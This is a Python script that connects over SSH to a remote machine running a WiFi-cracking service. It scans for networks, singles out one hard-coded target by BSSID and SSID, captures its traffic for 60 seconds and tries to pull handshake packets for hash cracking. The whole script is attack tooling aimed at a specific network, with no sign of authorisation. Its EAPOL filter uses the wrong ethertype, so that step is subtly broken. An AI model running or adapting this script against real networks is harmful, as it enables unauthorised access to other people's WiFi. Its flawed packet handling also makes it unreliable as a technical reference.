import paramiko
import time
import json

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('192.168.1.102', username='crazydb911', 
               key_filename='C:/Users/crazydb911/.ssh/opremote_ed25519', timeout=10)

# 1. Trigger scan
print("=== Scanning WiFi ===")
stdin, stdout, stderr = client.exec_command('curl -s -X POST http://localhost:8765/api/scan', timeout=10)
print("Scan triggered:", stdout.read().decode().strip())

time.sleep(15)

# 2. Get state
stdin, stdout, stderr = client.exec_command('curl -s http://localhost:8765/api/state', timeout=10)
state = json.loads(stdout.read().decode())
print(f"Status: {state['status']}")
print(f"AP count: {len(state['ap_list'])}")
print("\nNetworks:")
target_bssid = None
for i, ap in enumerate(state['ap_list']):
    marker = " <- TARGET" if ap['bssid'].lower() == '6c:4f:89:4c:a0:e4' else ""
    print(f"  {i}: {ap['ssid'] or '(hidden)'} | {ap['bssid']} | ch{ap['channel']} | {ap['security']} | RSSI {ap['rssi']}{marker}")
    if ap['bssid'].lower() == '6c:4f:89:4c:a0:e4':
        target_bssid = ap['bssid']
        target_idx = i

# 3. If found 32H9F_5G, capture it
if target_bssid:
    print(f"\n=== Capturing 32H9F_5G ({target_bssid}) for 60s ===")
    ssid = "32H9F_5G"
    stdin, stdout, stderr = client.exec_command(
        f'curl -s -X POST "http://localhost:8765/api/capture?bssid={target_bssid}&ssid={ssid}&duration=60"',
        timeout=10
    )
    print("Capture triggered:", stdout.read().decode().strip())
    
    # Wait for capture
    time.sleep(70)
    
    # Check state
    stdin, stdout, stderr = client.exec_command('curl -s http://localhost:8765/api/state', timeout=10)
    state = json.loads(stdout.read().decode())
    print(f"\nStatus: {state['status']}")
    print(f"Message: {state['message']}")
    print(f"Capture file: {state['capture_file']}")
    
    # 4. Extract hashes
    print("\n=== Extracting hashes ===")
    # The capture file is on Mac, need to extract there
    # But Mac cracker's extract endpoint expects upload...
    # Let's use a direct command on Mac instead
    cap_file = state['capture_file']
    if cap_file and 'None' not in cap_file:
        stdin, stdout, stderr = client.exec_command(
            f'python3 -c "from scapy.all import *; pkts = rdpcap(\'{cap_file}\'); print(f\'Packets: {{len(pkts)}}\'); eapol = [p for p in pkts if p.haslayer(Ether) and p[Ether].type == 0x8863]; print(f\'EAPOL: {{len(eapol)}}\')"',
            timeout=30
        )
        print("Extraction:", stdout.read().decode().strip())
        print("Errors:", stderr.read().decode().strip())
else:
    print("\n=== 32H9F_5G NOT FOUND in scan ===")

# 5. Show log
stdin, stdout, stderr = client.exec_command('tail -20 /Users/crazydb911/wifi_cracker.log')
print("\nMac log:")
print(stdout.read().decode())

client.close()
print("Done!")
